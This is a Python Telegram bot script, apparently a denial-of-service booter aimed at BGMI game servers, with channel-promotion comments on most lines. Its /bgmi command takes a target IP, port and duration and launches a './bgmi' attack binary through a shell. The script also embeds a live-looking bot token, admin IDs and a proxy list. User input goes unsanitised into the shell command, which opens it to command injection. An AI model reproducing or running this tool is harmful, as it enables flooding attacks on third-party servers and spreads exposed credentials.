...
# Join :- @BrutalSaddy #bgmiddoserpython
...
# Join :- @BrutalSaddy #from keep_alive import keep_alive
# Join :- @BrutalSaddy #keep_alive()
# Join :- @BrutalSaddy # insert your Telegram bot token here
bot = telebot.TeleBot('7396834987:AAH6aaFns_g3R07oZKYDLgg3r4QbtP4UchY')

# Join :- @BrutalSaddy # Admin user IDs
admin_id = ["6576494515","550846310"]

# Join :- @BrutalSaddy # File to store allowed user IDs
USER_FILE = "users.txt"

# Join :- @BrutalSaddy # File to store command logs
LOG_FILE = "log.txt"


# Join :- @BrutalSaddy # List of proxy addresses
PROXIES = [
...
"https://134.73.65.97:6649"
    # Join :- @BrutalSaddy # Add more proxy addresses as needed
]
...
def log_command(user_id, target, port, time):
    ...
    with open(LOG_FILE, "a") as file:  # Join :- @BrutalSaddy # Open in "append" mode
...
# Join :- @BrutalSaddy # Function to handle the reply when free users run the /bgmi command
...
# Join :- @BrutalSaddy # Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =0

# Join :- @BrutalSaddy # Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Join :- @BrutalSaddy # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            ...
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 0:
                ...
                bot.reply_to(message, response)
                return
            # Join :- @BrutalSaddy # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Join :- @BrutalSaddy # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Join :- @BrutalSaddy # Convert time to integer
            time = int(command[3])  # Join :- @BrutalSaddy # Convert port to integer
            if time > 801:
                response = "Error: Time interval must be less than 80."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Join :- @BrutalSaddy # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time} 100"
                subprocess.run(full_command, shell=True)
                response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
        else:
            response = "✅ Usage :- /bgmi <target> <port> <time>"  # Join :- @BrutalSaddy # Updated command syntax
    else:
...
# Join :- @BrutalSaddy # Add /mylogs command to display logs recorded for bgmi and website commands
...
# Join :- @BrutalSaddy # Import the 'time' module for sleep functionality
import time
